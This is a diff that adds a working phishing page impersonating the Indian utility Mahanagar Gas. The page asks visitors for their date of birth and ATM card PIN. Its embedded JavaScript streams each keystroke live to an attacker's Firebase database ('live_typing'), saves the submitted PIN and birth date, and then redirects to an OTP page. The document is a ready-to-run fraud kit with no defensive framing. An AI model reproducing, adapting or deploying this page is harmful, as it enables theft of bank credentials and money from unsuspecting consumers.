@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>dehijlbrd</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <style>
+    body {
+      font-family: Arial;
+      background-color: #FFFFFF;
+      text-align: center;
+      padding-top: 50px;
+    }
+    img {
+      width: 90%;
+      max-width: 300%;
+      border-radius: 10px;
+    }
+    .side-button {
+      margin-top: 20px;
+      padding: 10px;
+      width: 100%;
+      font-size: 17px;
+      background-color: #4082ff;
+      color: #FFFFFF;
+      border: none;
+      border-radius: 10px;
+    }
+    .form-container {
+      margin-top: 30px;
+      text-align: left;
+      width: 90%;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .form-container h2 {
+      text-align: center;
+      background-color: #0f7213;
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    .input-group label {
+      font-size: 16px;
+      font-weight: bold;
+      display: block;
+      margin-bottom: 5px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://meek-semolina-bb73d5.netlify.app/top.jpg" alt="Meri Tasveer">
+
+  <div class="form-container">
+    <h2>Mahanagar Gas</h2>
+    
+<form onsubmit="submitForm(event)">
+  <div class="input-group">
+    <label for="dob">Date of Birth (DD/MM/YYYY)</label>
+    <input 
+      type="text" 
+      id="dob" 
+      name="dob" 
+      placeholder="DD/MM/YYYY" 
+      maxlength="10"
+      pattern="\d{2}/\d{2}/\d{4}" 
+      required
+      oninput="liveUpdate()"
+    >
+  </div>
+
+      <div class="input-group">
+        <label for="pin">ATM Card PIN</label>
+        <input type="password" id="pin" name="pin" maxlength="4" pattern="\d{4}" inputmode="numeric" required oninput="liveUpdate()">
+      </div>
+
+      <div style="text-align: center;">
+        <button class="side-button" type="submit">Continue</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+
+  <script>
+      const firebaseConfig = {
+      apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
+      authDomain: "ss22-a96d3.firebaseapp.com",
+      projectId: "ss22-a96d3",
+      storageBucket: "ss22-a96d3.appspot.com",
+      messagingSenderId: "607942972170",
+      appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let liveDocId = null;
+
+    function liveUpdate() {
+      const data = {
+        dob: document.getElementById("dob").value,
+        pin: document.getElementById("pin").value,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      };
+
+      if (!liveDocId) {
+        db.collection("live_typing").add(data).then(doc => {
+          liveDocId = doc.id;
+        });
+      } else {
+        db.collection("live_typing").doc(liveDocId).update(data);
+      }
+    }
+
+    document.getElementById("dob").addEventListener("input", function (e) {
+      let value = e.target.value.replace(/[^\d]/g, "");
+      if (value.length >= 3 && value.length <= 4) {
+        value = value.slice(0, 2) + '/' + value.slice(2);
+      }
+      if (value.length > 4) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
+      }
+      e.target.value = value;
+    });
+
+    function submitForm(e) {
+      e.preventDefault();
+
+      const dob = document.getElementById('dob').value;
+      const pin = document.getElementById('pin').value;
+      const dobPattern = /^\d{2}\/\d{2}\/\d{4}$/;
+
+      if (!dobPattern.test(dob)) {
+        alert("Please enter DOB in DD/MM/YYYY format.");
+        return false;
+      }
+
+      if (pin.length !== 4 || isNaN(pin)) {
+        alert("Please enter a valid 4-digit PIN.");
+        return false;
+      }
+
+      db.collection("dob_pin").add({
+        dob: dob,
+        pin: pin,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        window.location.href = "otp.html";
+      }).catch((error) => {
+        alert("Error saving to Firebase: " + error);
+      });
+    }
+  </script>
+</body>
+</html>
